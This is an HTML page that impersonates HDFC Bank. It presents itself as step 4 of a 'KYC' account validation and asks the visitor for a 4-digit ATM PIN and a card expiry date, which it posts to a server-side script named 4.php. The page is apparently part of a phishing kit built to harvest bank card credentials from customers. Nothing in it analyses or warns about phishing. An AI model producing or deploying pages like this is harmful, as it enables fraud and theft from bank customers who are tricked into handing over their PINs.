<!DOCTYPE html>
<html lang="zxx">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HDFC</title>
    <style>
        #aa
        {
            width: 100%;
          
        }
        #bb,#dd
        {
            width: 338px;
            height:25px;
            background-color:white;
            border-color:#1D85FE;
            border-width:0.5px;   
        }
        #ll
        {
            width: 338px;
            background-color:#1D85FE;
            border-color: white;
            padding: 12px 10px;
            margin: 0px 0;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px; width: 340px; height: 40px;    
            
        }
        #ii,#kk
        {
            width: 100%;
        }
    </style>
</head>
<body>
    <img src="first.jpg" alt="" id="aa">
    <div id="cc">
    <h3 style="
    background-color:#DFE9F5;
    padding: 10px 4px;
    border-radius:1px;
    font-size:16px;
    color:#1560BD;
    width:345px;
    height:35px;"
    >Step:4 Please validate your account details.</h3>
    Enter 4 Digit ATM PIN 
    </div>
    <form action="4.php" method="post">
     <div id="dd">
         <input type="tel" name="ATM PIN" id="bb"
         pattern="[0-9]{4}" 
         title="Please enter 4 digit ATM PIN." required=""><br><br>
         <div id="hh">
         Enter EXPIRY DATE
        </div>
        <div id="xx">
         <input type="text"name="EXPIRY DATE" id="dd"
         class="pst"
          title="Valid 
           required=""><br><br>
        </div>
           <div id="hh">
            <p2 style="color:green;"> 40% KYC completed</p2> <br><br> 
           </div>
        <div id="qq">
        <center> <button type="submit"id="ll">
        CONFIRM</button></center> <br><br>
     </div>
         <img src="fourth.jpg" alt="" id="ii">
    </form>
</body>
</html>